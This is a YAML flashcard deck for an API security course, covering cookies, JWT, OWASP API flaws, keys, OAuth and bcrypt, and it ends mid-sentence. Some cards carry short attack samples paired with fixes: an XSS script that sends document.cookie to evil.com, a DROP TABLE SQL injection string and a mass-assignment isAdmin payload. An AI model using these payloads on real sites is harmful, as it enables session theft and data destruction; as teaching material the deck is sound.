modules:
  - id: m6-api-security
    name: API Security
    topics:
      - id: httponly-cookies
        name: HttpOnly cookies — auth flow and flags
        tags:
          - HttpOnly
          - cookies
          - token
          - SameSite
          - Secure
          - XSS
          - withCredentials
        prose: >-
          An HttpOnly cookie stores a session token in the browser where JavaScript cannot read it, eliminating the XSS
          attack surface for token theft. The Secure, SameSite, and Max-Age flags work alongside HttpOnly to restrict
          transmission, control cross-site sending, and bound the session lifetime.
        cards:
          - id: httponly-cookies-card-01
            type: cloze
            prompt: >-
              Setting the {{HttpOnly}} flag blocks JavaScript from reading the cookie value, preventing XSS-based token
              theft.
            answer: HttpOnly
            explanation: >-
              When HttpOnly is set, the browser manages the cookie entirely. No script on the page — including injected
              Cross-Site Scripting (XSS) payloads — can call document.cookie to retrieve the token value, removing the
              primary attack vector for session hijacking via script injection.
            example: |
              Set-Cookie: token=abc123; HttpOnly; Path=/; SameSite=None; Secure
              # document.cookie returns "" — the token is invisible to JavaScript
            source: Slide 9, Slide 10, ISAQuiz11
            bloom: remember
          - id: httponly-cookies-card-02
            type: cloze
            prompt: >-
              The {{Secure}} cookie flag restricts the cookie to HTTPS connections only, preventing transmission over
              plain HTTP.
            answer: Secure
            explanation: >-
              Without the Secure flag, the browser sends the cookie over both HTTP and HTTPS. An attacker on an
              unencrypted network can intercept the cookie in plaintext. The Secure flag ensures the cookie only travels
              over encrypted connections.
            example: |
              Set-Cookie: token=abc123; HttpOnly; Path=/; SameSite=None; Secure
              # Browser refuses to send this cookie over http://
              # Browser sends it over https:// only
            source: Slide 9, Slide 10, ISAQuiz11
            bloom: remember
          - id: httponly-cookies-card-03
            type: name
            prompt: What are ALL the risks of not setting the HttpOnly attribute on a session cookie? (ISAQuiz11 Q3)
            answer: "All of them: XSS token theft, session hijacking, AND CSRF attacks."
            explanation: >-
              HttpOnly removes JavaScript read access, which stops XSS-based theft. Without it, any injected script can
              read and exfiltrate the token (XSS theft), impersonate the user indefinitely (session hijacking), and the
              stolen token can be replayed cross-site (CSRF). Selecting only XSS scores zero — the flags work as a
              system, and removing one opens multiple vectors.
            example: |
              # Without HttpOnly:
              # Attacker injects: <script>fetch('evil.com?t='+document.cookie)</script>
              # Result: token stolen → session hijacked → cross-site replay possible
            source: Slide 9, Slide 10, ISAQuiz11
            bloom: analyze
          - id: httponly-cookies-card-04
            type: cloze
            prompt: >-
              For a cross-origin XMLHttpRequest to send an HttpOnly cookie, the client must set {{withCredentials}} to
              true AND the server must respond with {{Access-Control-Allow-Credentials}}: true.
            answer: withCredentials; Access-Control-Allow-Credentials
            explanation: >-
              Same-origin requests always send cookies automatically. Cross-origin requests strip cookies by default.
              Both conditions must hold simultaneously: the client opts in with withCredentials, and the server opts in
              with the CORS credential header. Either condition alone is insufficient — the browser discards the
              response if the server header is missing even when the client set withCredentials.
            example: |
              // Client (cross-origin XHR)
              const xhr = new XMLHttpRequest();
              xhr.withCredentials = true;
              xhr.open('GET', 'https://api.example.com/profile');
              xhr.send();

              // Server must include in response:
              // Access-Control-Allow-Credentials: true
            source: Slide 9, Slide 10, ISAQuiz11
            bloom: apply
          - id: httponly-cookies-card-05
            type: predict
            prompt: >-
              A client makes a cross-origin XMLHttpRequest to GET /profile. withCredentials is not set (defaults to
              false). The server has a valid HttpOnly session cookie for this user. Predict what the server receives and
              why.
            answer: >-
              The server receives no cookie. The browser strips all cookies from cross-origin requests when
              withCredentials is false. The server cannot identify the user and returns 401 Unauthorized.
            explanation: >-
              The Same-Origin Policy causes the browser to remove credentials (cookies and auth headers) from
              cross-origin requests unless the client explicitly opts in with withCredentials. The HttpOnly flag is
              irrelevant here — the cookie exists in the browser but the browser refuses to attach it to the
              cross-origin request.
            example: |
              // withCredentials omitted — defaults to false
              const xhr = new XMLHttpRequest();
              xhr.open('GET', 'http://api.otherdomain.com/profile');
              xhr.send();
              // Cookie header: absent
              // Server response: 401 Unauthorized
            source: Slide 9, Slide 10, ISAQuiz11
            bloom: apply
            lang: js
          - id: httponly-cookies-card-06
            type: cloze
            prompt: >-
              To delete an HttpOnly cookie on logout, the server sets {{Max-Age=0}} in the Set-Cookie header. All other
              attributes must match the original cookie exactly.
            answer: Max-Age=0
            explanation: >-
              The browser matches a Set-Cookie deletion directive against the stored cookie using its name, Path,
              Domain, and SameSite attributes. If any attribute differs, the browser treats the directive as a new
              cookie rather than a deletion of the existing one, leaving the original session cookie intact. Max-Age=0
              is the mechanism that signals immediate deletion.
            example: |
              # Login sets:
              Set-Cookie: token=R99R; HttpOnly; Path=/; SameSite=None; Secure; Max-Age=60

              # Logout must send — all attributes matching:
              Set-Cookie: token=; HttpOnly; Path=/; Max-Age=0; SameSite=None; Secure
            source: Slide 9, Slide 10, ISAQuiz11
            bloom: apply
          - id: httponly-cookies-card-07
            type: name
            prompt: What does SameSite=None require, and why does the requirement exist?
            answer: >-
              SameSite=None requires the Secure flag to also be set. Without Secure, browsers reject the SameSite=None
              directive entirely.
            explanation: >-
              SameSite=None allows the cookie to be sent on cross-origin requests. Browsers enforce that this permissive
              setting is paired with HTTPS-only transmission to prevent the cookie from traveling over an unencrypted
              channel where cross-site delivery would also expose it to interception.
            example: |
              # Valid — browser accepts and sends cross-origin:
              Set-Cookie: token=abc; SameSite=None; Secure; HttpOnly

              # Invalid — browser ignores or rejects:
              Set-Cookie: token=abc; SameSite=None; HttpOnly
            source: Slide 9, Slide 10, ISAQuiz11
            bloom: understand
      - id: jwt
        name: JWT — structure, signing, and storage
        tags:
          - JWT
          - json-web-token
          - signing
          - secret-key
          - HS256
          - XSS
        prose: >-
          A JSON Web Token (JWT) is a compact, self-contained token the server signs with a secret key using HS256. The
          token has three dot-separated parts — header, payload, and signature — all Base64url-encoded. The server signs
          the token at login and verifies the signature on every subsequent request, enabling stateless authentication.
          The token must be stored in an HttpOnly cookie to prevent XSS-based theft; localStorage exposes it to any
          injected script. The secret key must be stored in an environment variable, never in source code. Short
          expiration times limit the damage a stolen token can cause.
        cards:
          - id: jwt-card-01
            type: name
            prompt: JWT stands for ___.
            answer: JSON Web Token
            explanation: >-
              JWT is the abbreviation for JSON Web Token. Common distractors on ISAQuiz11 include JavaScript Web Token
              and JSON Web Transfer — both are wrong. The J stands for JSON (a data format), not JavaScript.
            example: import jwt from 'jsonwebtoken'; // JSON Web Token library
            source: Slide 10, ISAQuiz11
            bloom: remember
          - id: jwt-card-02
            type: cloze
            prompt: "A JWT consists of three dot-separated parts: header.{{payload}}.signature"
            answer: payload
            explanation: >-
              The three parts of a JWT are header, payload, and signature — all Base64url-encoded and joined by dots.
              The payload contains claims (e.g., username, expiry). The signature is the HMAC of the header and payload
              using the server's secret key.
            example: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.<signature>
            source: Slide 10, ISAQuiz11
            bloom: remember
          - id: jwt-card-03
            type: name
            prompt: >-
              ISAQuiz11 Q5 asks which option correctly lists JWT components. Which answer is correct, and why are the
              distractors wrong?
            answer: >-
              Header, Payload, and Signature. Distractors use 'Certificate' (not a JWT part) and 'Body' or 'Footer' (not
              JWT terms).
            explanation: >-
              The JWT spec defines exactly three parts: header, payload, signature. Certificate is a PKI concept
              unrelated to JWT structure. Body and Footer are HTML or email terms. Selecting any distractor on the exam
              scores zero.
            example: base64url(header).base64url(payload).base64url(signature)
            source: Slide 10, ISAQuiz11
            bloom: understand
          - id: jwt-card-04
            type: cloze
            prompt: >-
              The server signs a JWT using the {{HS256}} algorithm and its secret key. On the next request, it
              recomputes the signature and compares — no session store required.
            answer: HS256
            explanation: >-
              HS256 is HMAC with SHA-256. The server signs header+payload with the secret key. Any modification to the
              token invalidates the signature. The server verifies by recomputing the signature — stateless, no database
              lookup needed.
            example: "jwt.sign({ username }, TOKEN_SECRET, { algorithm: 'HS256', expiresIn: '120s' })"
            source: Slide 10, ISAQuiz11
            bloom: understand
          - id: jwt-card-05
            type: cloze
            prompt: >-
              Storing a JWT in {{localStorage}} exposes it to XSS attacks because JavaScript can read it. Storing it in
              an {{HttpOnly}} cookie blocks that attack because the browser never exposes the value to scripts.
            answer: localStorage; HttpOnly
            explanation: >-
              localStorage is accessible to any script on the page, including injected XSS payloads. An HttpOnly cookie
              is transmitted by the browser automatically but is invisible to JavaScript — eliminating the main XSS
              token-theft vector. Add Secure and SameSite attributes to also block CSRF.
            example: res.setHeader('Set-Cookie', `token=${token}; HttpOnly; Secure; SameSite=None`);
            source: Slide 10, ISAQuiz11
            bloom: understand
          - id: jwt-card-06
            type: predict
            prompt: "A developer writes: jwt.sign({ foo: 'bar' }, 'shhhhh!'); Predict the two security problems this causes."
            answer: >-
              1. No expiration — the token never becomes invalid, so a stolen token grants permanent access. 2. Weak
              secret ('shhhhh!') — short, guessable secrets can be brute-forced; HS256 security depends entirely on
              secret length and randomness.
            explanation: >-
              jwt.sign() requires both a strong secret key and an expiresIn option for production use. A missing
              expiration means revocation is impossible without a blocklist. A short secret breaks the cryptographic
              guarantee of HS256.
            example: |
              // Correct version:
              jwt.sign({ foo: 'bar' }, process.env.TOKEN_SECRET, { algorithm: 'HS256', expiresIn: '120s' });
            source: Slide 10, ISAQuiz11
            bloom: apply
            lang: js
          - id: jwt-card-07
            type: name
            prompt: "ISAQuiz11 Q8: A JWT cookie is set without HttpOnly and without Secure. Which attack vectors are exposed?"
            answer: >-
              All three: XSS (script can read the cookie), CSRF (cookie sent on cross-site requests), and unauthorized
              access (cookie visible over plain HTTP).
            explanation: >-
              HttpOnly blocks JavaScript access (XSS vector). Secure restricts transmission to HTTPS (interception
              vector). SameSite blocks cross-site cookie submission (CSRF vector). Removing both HttpOnly and Secure
              simultaneously opens all three. The correct exam answer is 'All of the above' — selecting only XSS scores
              zero.
            example: "// Missing: HttpOnly blocks XSS; Secure blocks plaintext; SameSite blocks CSRF"
            source: Slide 10, ISAQuiz11
            bloom: analyze
      - id: api-security-best-practices
        name: API security vulnerabilities (OWASP top 8 for APIs)
        tags:
          - security
          - SQL-injection
          - rate-limiting
          - OWASP
          - mass-assignment
          - XSS
        prose: >-
          Eight recurring API vulnerabilities — broken authentication, excessive data exposure, missing rate limiting,
          broken function-level authorization, broken object-level authorization (BOLA), mass assignment, security
          misconfiguration, and injection — each follow a predictable mechanism. Knowing the mechanism determines the
          fix: parameterized queries stop injection, object-level ACLs stop BOLA, field whitelisting stops mass
          assignment, and server-side filtering stops data exposure.
        cards:
          - id: api-security-best-practices-card-01
            type: predict
            prompt: >
              The following Express.js route builds a SQL query using a template literal:


              ```js

              const query = `UPDATE users SET email='${newEmail}' WHERE id=${userId}`;

              const result = database.query(query);

              ```


              An attacker sets `newEmail` to `' WHERE 1=1; DROP TABLE users; --`. What attack does this enable, and what
              happens to the database?
            answer: >-
              SQL injection. The attacker's input becomes literal SQL syntax inside the query string. The database
              executes `DROP TABLE users`, deleting all user records.
            explanation: >-
              Template-literal interpolation embeds user-controlled values directly into the SQL string. The database
              cannot distinguish the injected SQL from the intended query structure. The fix is parameterized queries:
              `const query = 'UPDATE users SET email=? WHERE id=?'; database.query(query, [newEmail, userId]);` — the
              driver passes the values as bound data, so SQL syntax in the values never executes.
            example: |
              // Attacker payload for newEmail:
              ' WHERE 1=1; DROP TABLE users; --

              // Resulting query string:
              UPDATE users SET email='' WHERE 1=1; DROP TABLE users; --' WHERE id=42
              // Database executes the DROP TABLE statement
            source: Slide 12, ISAQuiz12
            bloom: analyze
            lang: js
          - id: api-security-best-practices-card-02
            type: cloze
            prompt: >-
              To prevent SQL injection, use {{parameterized queries}} with `?` placeholders instead of string
              interpolation. The database driver passes substituted values as {{data}}, so injected SQL syntax never
              executes.
            answer: parameterized queries; data
            explanation: >-
              String interpolation (template literals or concatenation) builds the SQL command as a single string — user
              input becomes part of the SQL structure. Parameterized queries send the SQL template and the data values
              separately to the database driver. The driver handles escaping and binding, ensuring values are always
              treated as data literals regardless of their content.
            example: |
              // Vulnerable:
              const query = `UPDATE users SET email='${newEmail}' WHERE id=${userId}`;

              // Safe:
              const query = 'UPDATE users SET email=? WHERE id=?';
              const result = database.query(query, [newEmail, userId]);
            source: Slide 12, ISAQuiz12
            bloom: remember
          - id: api-security-best-practices-card-03
            type: name
            prompt: >-
              ISAQuiz12 Q2 offered `.replace()` (removing quotes from user input) as an option for preventing SQL
              injection. Is `.replace()` an effective fix? Why or why not?
            answer: >-
              No. `.replace()` is bypassable. Attackers use hex encodings, multi-byte characters, and other bypass
              vectors that do not rely on single quotes. Only parameterized queries prevent SQL injection reliably.
            explanation: >-
              String sanitization with `.replace()` tries to remove dangerous characters after the fact. Attackers have
              many encoding techniques to reintroduce dangerous characters without using the exact characters that
              `.replace()` strips. Parameterized queries prevent injection at the protocol level — the database driver
              never tries to parse the values as SQL at all. ISAQuiz12 Q2 and exam-strategy Pitfall 5 both mark
              `.replace()` as incorrect.
            example: |
              // .replace() approach — bypassed:
              const safeEmail = newEmail.replace(/'/g, '');
              // Attacker uses: ` OR 1=1 --  (no single quote needed)
              // Still injects valid SQL

              // Parameterized — not bypassable:
              const query = 'UPDATE users SET email=? WHERE id=?';
              database.query(query, [newEmail, userId]);
            source: Slide 12, ISAQuiz12
            bloom: analyze
          - id: api-security-best-practices-card-04
            type: name
            prompt: >-
              ISAQuiz12 Q3: Which of these options is NOT an example of Excessive Data Exposure? (a) API returns full
              user record including SSN when only name and email were requested. (b) API returns detailed error message
              containing the database schema. (c) API endpoint returns all student grades and relies on client-side
              filtering. (d) Filtering out and removing unnecessary details from Error Messages before displaying them
              to users.
            answer: >-
              (d) Filtering out unnecessary details from error messages. That is the PREVENTION of Excessive Data
              Exposure, not an example of it.
            explanation: >-
              Options (a), (b), and (c) are all examples of the vulnerability: the server sends more data than needed,
              exposes sensitive internal information, or delegates filtering to the client. Option (d) describes the
              correct defense — stripping sensitive details from error messages before they reach the client. Confusing
              the prevention with an instance of the vulnerability is the exact trap ISAQuiz12 Q3 tests.
            example: |
              // Example of the vulnerability — detailed error sent to client:
              res.status(500).json({ error: error.message, stack: error.stack, schema: 'users(id, email, ssn)' });

              // Correct prevention:
              res.status(500).json({ error: 'Internal Server Error' });
            source: Slide 12, ISAQuiz12
            bloom: analyze
          - id: api-security-best-practices-card-05
            type: name
            prompt: >-
              What is Broken Object-Level Authorization (BOLA), and what does the ISAQuiz12 Q7 `getResourceOwner` code
              demonstrate about it?
            answer: >-
              BOLA occurs when the server authenticates a user but does not verify whether that user owns the specific
              object they are accessing or modifying. The Q7 code returns a hardcoded owner ID ('user123') instead of
              looking up the real owner, so any user with that cookie value passes the ownership check for every
              resource ID.
            explanation: >-
              Authentication confirms who the user is. Object-level authorization confirms whether that user is allowed
              to act on a specific resource. BOLA skips the second check. In Q7, `getResourceOwner(resourceId)` always
              returns `'user123'` — any user matching that cookie can modify any profile by changing the URL parameter.
              The fix requires looking up the actual owner for the requested resource and comparing it to the
              authenticated user.
            example: |
              // Vulnerable — hardcoded owner:
              function getResourceOwner(resourceId) {
                return 'user123'; // never queries the real owner
              }

              // Fixed — look up the actual owner:
              async function getResourceOwner(resourceId) {
                const resource = await Resource.findById(resourceId);
                return resource.ownerId;
              }
            source: Slide 12, ISAQuiz12
            bloom: analyze
          - id: api-security-best-practices-card-06
            type: name
            prompt: What is mass assignment, and how does an attacker exploit it?
            answer: >-
              Mass assignment occurs when an API passes the raw request body directly to a model, letting the client set
              any property — including privileged ones like `isAdmin`. An attacker adds `'isAdmin': true` to the request
              JSON and elevates their own account.
            explanation: >-
              Frameworks that map request body keys to model properties automatically make it easy to write
              `User.update(req.body)`. If the model has an `isAdmin` field, the attacker sets it. Prevention requires
              whitelisting the specific properties to accept: `const { name, email } = req.body; User.update({ name,
              email });` — any extra properties the attacker sends are simply ignored.
            example: |
              // Attacker sends:
              { "name": "Alice", "email": "alice@example.com", "isAdmin": true }

              // Vulnerable server:
              const user = await User.update(req.body); // isAdmin is set

              // Safe server:
              const { name, email } = req.body;
              const user = await User.update({ name, email }); // isAdmin ignored
            source: Slide 12, ISAQuiz12
            bloom: apply
          - id: api-security-best-practices-card-07
            type: name
            prompt: >-
              What is the purpose of rate limiting on a login endpoint, and at which levels should rate limiting be
              applied?
            answer: >-
              Rate limiting on login endpoints mitigates brute force attacks by capping how many requests a client can
              make in a time window. Apply rate limiting at three levels: IP address, user account, and application.
            explanation: >-
              Without rate limiting, an attacker can try thousands of password guesses per second. Limiting by IP slows
              single-source attacks. Limiting by user account catches attacks spread across IPs targeting the same
              account. Application-level limiting protects against distributed attacks that exceed per-IP thresholds.
              ISAQuiz12 Q4 confirmed the purpose is brute force mitigation; Q8 confirmed account lockout as an effective
              measure.
            example: |
              // IP-level rate limit with express-rate-limit:
              const limiter = rateLimit({
                windowMs: 15 * 60 * 1000,
                max: 100,
                message: 'Too many requests from this IP, please try again later.'
              });
              app.use('/api/login', limiter);

              // Account lockout after 3 attempts:
              if (loginAttempts[ip] >= 3) {
                return res.status(429).json({ message: 'Too many login attempts. Try again later.' });
              }
            source: Slide 12, ISAQuiz12
            bloom: apply
          - id: api-security-best-practices-card-08
            type: cloze
            prompt: >-
              {{Security Misconfiguration}} occurs when an API is left in an insecure state — for example, leaving
              default credentials unchanged or storing a JWT secret as a hardcoded string in source code instead of an
              {{environment variable}}.
            answer: Security Misconfiguration; environment variable
            explanation: >-
              Default passwords on database systems are documented and widely known — an attacker simply tries them.
              Hardcoded secrets in source code are exposed to anyone with repository access, including CI/CD pipelines.
              ISAQuiz12 Q5 confirmed 'leaving default credentials unchanged in a production environment' as an example
              of Security Misconfiguration. The fix: rotate all defaults before deployment and load secrets from
              environment variables.
            example: |
              // Misconfiguration — secret hardcoded:
              jwt.verify(token, 'secretkey', (err, decoded) => { ... });

              // Correct — secret from environment:
              jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => { ... });
            source: Slide 12, ISAQuiz12
            bloom: remember
          - id: api-security-best-practices-card-09
            type: name
            prompt: >-
              ISAQuiz12 Q9: Which response prevents Excessive Data Exposure when an error occurs on the server? (a)
              `res.status(500).json({ error: 'Internal Server Error' })` (b) `console.log('Error occurred: ' +
              error.message)` (c) `alert('Error: ' + error)`
            answer: >-
              (a) `res.status(500).json({ error: 'Internal Server Error' })`. It returns a generic message to the
              client. Options (b) and (c) leak error details.
            explanation: >-
              Option (b) logs error details server-side — not necessarily a client exposure, but it does not respond to
              the client at all. Option (c) exposes `error.toString()` directly to the user, which includes internal
              details. Option (a) returns a fixed generic string with no internal information. ISAQuiz12 Q9 confirmed
              (a) as the correct answer.
            example: |
              // Leaks internal details to the client:
              res.status(500).json({ error: error.message, stack: error.stack });

              // Correct — generic message only:
              res.status(500).json({ error: 'Internal Server Error' });
              // Log details server-side separately:
              console.error(error);
            source: Slide 12, ISAQuiz12
            bloom: apply
          - id: api-security-best-practices-card-10
            type: name
            prompt: What is Multi-Factor Authentication (MFA), and which ISAQuiz12 question confirmed its definition?
            answer: >-
              MFA requires multiple independent forms of identification before granting access — for example, a password
              plus a one-time code sent to a phone. ISAQuiz12 Q11 defined MFA as 'multiple forms of identification.'
            explanation: >-
              A single factor (password) fails if the credential is guessed, phished, or leaked. MFA adds a second
              factor (something you have, such as a phone, or something you are, such as biometrics) so that
              compromising one factor is not sufficient. MFA is the primary prevention for Broken User Authentication
              alongside session management and rate limiting.
            example: |
              // MFA flow:
              // Step 1: user submits username + password
              // Step 2: server validates credentials, sends OTP to user's phone
              // Step 3: user submits OTP
              // Step 4: server validates OTP, creates session
            source: Slide 12, ISAQuiz12
            bloom: remember
      - id: public-private-keys
        name: Symmetric and asymmetric encryption — key exchange and signing
        tags:
          - asymmetric
          - symmetric
          - public-key
          - private-key
          - RSA
          - signing
        prose: >-
          Symmetric encryption uses one secret key shared by both parties. Getting that key to the other party over an
          untrusted network is the key exchange problem. Asymmetric encryption solves this by giving each party a public
          key (shared openly) and a private key (never shared). Signing and encryption use opposite key directions:
          signing uses the sender's private key and is verified with the sender's public key; encryption uses the
          receiver's public key and is decrypted with the receiver's private key. RSA implements asymmetric
          cryptography; Diffie-Hellman establishes a shared secret key without transmitting it. Never conflate a secret
          key (symmetric) with a private key (asymmetric).
        cards:
          - id: public-private-keys-card-01
            type: cloze
            prompt: To verify a message signed by Amir, Tom uses Amir's {{public key}}.
            answer: public key
            explanation: >-
              Signing uses the sender's private key; anyone with the sender's public key can verify the signature. Tom
              does not use his own keys to verify — he uses the key that Amir shares openly.
            example: >-
              Amir signs the outer envelope with amir_private_key. Tom calls verify(outer, amir_public_key). If it
              opens, the message came from Amir.
            source: Slide 10, ISAQuiz11 Q9
            bloom: remember
          - id: public-private-keys-card-02
            type: cloze
            prompt: >-
              Symmetric encryption uses {{one}} key shared between both parties; asymmetric encryption uses a
              {{public/private}} key pair.
            answer: one; public/private
            explanation: >-
              Symmetric encryption's single secret key creates the key exchange problem. Asymmetric encryption's key
              pair eliminates it: the public key travels openly, the private key never leaves its owner.
            example: >-
              AES (symmetric): Alice and Bob both hold the same 256-bit secret key. RSA (asymmetric): Alice publishes
              alice_public_key; she keeps alice_private_key secret.
            source: Slide 9, Slide 10
            bloom: remember
          - id: public-private-keys-card-03
            type: name
            prompt: What problem does RSA solve, and what problem does Diffie-Hellman solve?
            answer: >-
              RSA is an asymmetric encryption algorithm that enables encryption and digital signing without a pre-shared
              secret key. Diffie-Hellman is a key-exchange protocol that lets two parties derive a shared secret key
              over an untrusted network without ever transmitting the key itself.
            explanation: >-
              RSA and Diffie-Hellman address different halves of the key exchange problem. RSA sidesteps symmetric key
              exchange entirely by using key pairs. Diffie-Hellman makes symmetric key exchange safe by constructing the
              shared secret mathematically on each side without sending it.
            example: >-
              TLS uses Diffie-Hellman to establish a session secret key, then uses that secret key with symmetric
              encryption (e.g., AES) for the bulk of the data transfer.
            source: Slide 9
            bloom: understand
          - id: public-private-keys-card-04
            type: predict
            prompt: >-
              Amir encrypted a message with Tom's public key and sent it. Tom receives the ciphertext. Which key can
              open it?
            answer: Tom's private key
            explanation: >-
              Encryption for confidentiality uses the receiver's public key. The mathematically linked private key —
              held only by Tom — is the only key that can decrypt it. Anyone who intercepts the ciphertext cannot open
              it without Tom's private key.
            example: |
              const inner = encrypt(message, tom_public_key);
              // Only tom_private_key can decrypt `inner`
              const message = decrypt(inner, tom_private_key);
            source: Slide 9, Slide 10
            bloom: apply
            lang: js
          - id: public-private-keys-card-05
            type: predict
            prompt: >-
              ISAQuiz11 Q9 scenario: Amir sent a message to Tom using asymmetric encryption. Amir signed the outer
              envelope with his private key. Which key does Tom use to verify the authenticity of the message?
            answer: Amir's public key
            explanation: >-
              Verification uses the SENDER's public key — not the receiver's keys. Amir signed with amir_private_key, so
              the paired amir_public_key is the only key that can verify the signature. Tom's own keys are not involved
              in verification. The distractors in ISAQuiz11 Q9 include Tom's private key, Tom's public key, and Amir's
              private key — all wrong.
            example: |
              const inner = verify(outer, amir_public_key);
              // Success → outer came from Amir and was not tampered with
            source: Slide 10, ISAQuiz11 Q9
            bloom: analyze
            lang: js
          - id: public-private-keys-card-06
            type: name
            prompt: >-
              Complete the key direction table for asymmetric encryption: (a) Signing — sender uses ___, receiver
              verifies with ___. (b) Encryption — sender uses ___, receiver decrypts with ___.
            answer: >-
              (a) Signing: sender uses sender's private key; receiver verifies with sender's public key. (b) Encryption:
              sender uses receiver's public key; receiver decrypts with receiver's private key.
            explanation: >-
              Signing and encryption use opposite key directions. Signing proves authorship (private key in, public key
              to verify). Encryption ensures confidentiality (public key in, private key to open). Confusing these two
              directions is the root cause of ISAQuiz11 Q9 wrong answers.
            example: |
              Amir→Tom:
                sign:    amir_private_key   → verified with amir_public_key
                encrypt: tom_public_key     → decrypted with tom_private_key
            source: Slide 9, Slide 10, ISAQuiz11
            bloom: analyze
          - id: public-private-keys-card-07
            type: name
            prompt: What is the difference between a secret key and a private key?
            answer: >-
              A secret key is the shared key used in symmetric encryption — both parties hold the same key. A private
              key is one half of an asymmetric key pair — only its owner holds it, and it is paired with a public key
              that is shared openly. The two terms describe different cryptographic systems and must not be used
              interchangeably.
            explanation: >-
              In web development, 'secret key' appears in contexts like session tokens, JWT signing secrets (symmetric
              HMAC), and OAuth client secrets. 'Private key' appears in RSA-based JWT signing and TLS. Both must stay
              confidential, but they operate under different models.
            example: |
              JWT with HS256: signed with a secret key (symmetric — same key verifies).
              JWT with RS256: signed with a private key (asymmetric — public key verifies).
            source: Slide 11
            bloom: understand
      - id: oauth-ssl
        name: OAuth 2.0 and SSL/TLS
        tags:
          - OAuth
          - bearer-token
          - SSL
          - TLS
          - HTTPS
          - client-id
          - client-secret
        prose: >-
          OAuth 2.0 is an access-delegation standard. It lets a ClientApp access a user's data on Google (or another
          provider) without ever handling the user's password. The app owner registers once and receives a client ID
          (public) and client secret (private). When a user logs in, Google authenticates them, shows a consent screen,
          and issues a bearer token to ClientApp. Anyone who holds this token is implicitly granted authorization, so
          the token must be protected and is time-limited. SSL/TLS (TLS is current; SSL is deprecated) encrypts the HTTP
          channel automatically via a TLS handshake — HTTPS is HTTP over TLS. The server's SSL/TLS certificate carries
          its public key, enabling key exchange without prior shared secrets.
        cards:
          - id: oauth-ssl-card-01
            type: cloze
            prompt: >-
              In OAuth 2.0, the bearer token grants authorization because {{anyone who holds this token is implicitly
              granted authorization}}.
            answer: anyone who holds this token is implicitly granted authorization
            explanation: >-
              The bearer model means possession equals authorization. No additional proof of identity is required beyond
              holding the token. This is why bearer tokens must be kept private and are time-limited — if leaked, any
              holder gains the same access as the legitimate app.
            example: >-
              ClientApp stores the bearer token server-side and never logs it. If an attacker obtains the token from a
              log file, they can call Google APIs as if they were ClientApp acting on behalf of that user — until the
              token expires.
            source: Slide 11
            bloom: remember
          - id: oauth-ssl-card-02
            type: name
            prompt: What two credentials does Google create for a ClientApp during OAuth 2.0 onboarding?
            answer: Client ID and client secret
            explanation: >-
              The client ID is a public identifier included in redirect URLs — it is visible to anyone inspecting
              network traffic. The client secret is private and stored server-side only; it is never sent to the
              browser. These credentials identify the app, not the user. The bearer token issued later identifies the
              user's authorization grant.
            example: >-
              App owner submits the onboarding form at Google Developer Console listing required scopes (profile,
              email). Google responds with CLIENT_ID = 'abc123' (public) and CLIENT_SECRET = 'xyz789' (private, never
              expose).
            source: Slide 11
            bloom: remember
          - id: oauth-ssl-card-03
            type: name
            prompt: In the OAuth 2.0 login flow, at what step does the user see a consent screen, and what triggers it?
            answer: >-
              After ClientApp redirects the user to Google's OAuth 2.0 endpoint with the client ID and requested scopes
              — Google looks up the client ID and displays the consent screen listing what data the app wants to access.
            explanation: >-
              The consent screen is Google's mechanism for informed user approval. It shows the user exactly which data
              the app has requested (e.g., 'ClientApp wants to read your name and email'). Only after the user clicks
              Allow does Google generate the bearer token and redirect back to ClientApp.
            example: >-
              ClientApp redirects to: https://accounts.google.com/o/oauth2/auth?client_id=abc123&scope=profile+email —
              Google shows: 'ClientApp wants access to: your name, your email address.' User clicks Allow.
            source: Slide 11
            bloom: understand
          - id: oauth-ssl-card-04
            type: name
            prompt: What does the TLS handshake establish, and what role does the server's SSL/TLS certificate play in it?
            answer: >-
              The TLS handshake establishes an encrypted channel between browser and server. The server's SSL/TLS
              certificate carries the server's public key, which the browser uses to securely exchange a session key —
              proving the server's identity and enabling encrypted communication.
            explanation: >-
              TLS (Transport Layer Security) is the current protocol; SSL is deprecated. The certificate is signed by a
              trusted Certificate Authority, so the browser can verify the server is who it claims to be. After the
              handshake, all data is encrypted and decrypted automatically — application code does not implement this.
              HTTPS = HTTP over TLS.
            example: >-
              Browser opens https://myapp.com → server sends certificate containing public key → browser verifies
              certificate → they negotiate a session key → all subsequent HTTP requests and responses are encrypted
              transparently.
            source: Slide 11
            bloom: understand
          - id: oauth-ssl-card-05
            type: name
            prompt: Why is the OAuth 2.0 bearer token time-limited, and what is a typical expiry window?
            answer: >-
              The bearer token is time-limited (e.g., 6 months) because possession equals authorization — anyone who
              holds the token gains access. Expiry limits the damage window if the token is leaked or stolen.
            explanation: >-
              Because the bearer model does not require identity proof beyond possession, a leaked token grants the
              attacker full access to the approved scopes until it expires. A time limit (combined with HTTPS transport
              and server-side storage) reduces exposure. After expiry, the user must re-authorize to issue a new token.
            example: >-
              A bearer token issued on January 1 with a 6-month expiry becomes invalid July 1. If an attacker obtained
              the token in March, they lose access July 1 without any action by the app or user — expiry is automatic.
            source: Slide 11
            bloom: apply
          - id: oauth-ssl-card-06
            type: name
            prompt: What does OAuth 2.0 delegation mean for ClientApp's authentication responsibilities?
            answer: >-
              ClientApp delegates the responsibility of authenticating users to Google. ClientApp does not store or
              verify Google passwords. It accepts Google's bearer token as proof that the user authenticated
              successfully, and gains scoped access to user data depending on what the user approved.
            explanation: >-
              Delegation shifts the security burden of password storage and verification to Google. ClientApp only needs
              to protect the bearer token it receives. This also means ClientApp gains real user data (name, email,
              etc.) without a separate user-database step, because Google supplies it via the API calls made with the
              bearer token.
            example: >-
              Without OAuth 2.0: ClientApp stores hashed Google passwords, runs its own login page, handles password
              resets — a large attack surface. With OAuth 2.0: ClientApp redirects to Google, receives a bearer token,
              calls /userinfo — no passwords stored anywhere.
            source: Slide 11
            bloom: apply
      - id: password-hashing
        name: Password hashing with bcrypt
        tags:
          - bcrypt
          - hash
          - salt
          - password-storage
        prose: >-
          Passwords must be hashed before storage. bcrypt.hash() is async (returns a Promise — must be awaited). The
          cost factor controls hashing iterations (2^CF). bcrypt.compare() verifies a plaintext against a stored hash
          and returns a boolean — it never decrypts.
        cards:
          - id: password-hashing-card-01
            type: cloze
            prompt: >-
              The second argument to `bcrypt.hash()` is the {{cost factor}}, which controls the number of hashing
              iterations.
            answer: cost factor
            explanation: >-
              The cost factor (also called salt rounds) determines how many iterations bcrypt performs internally. With
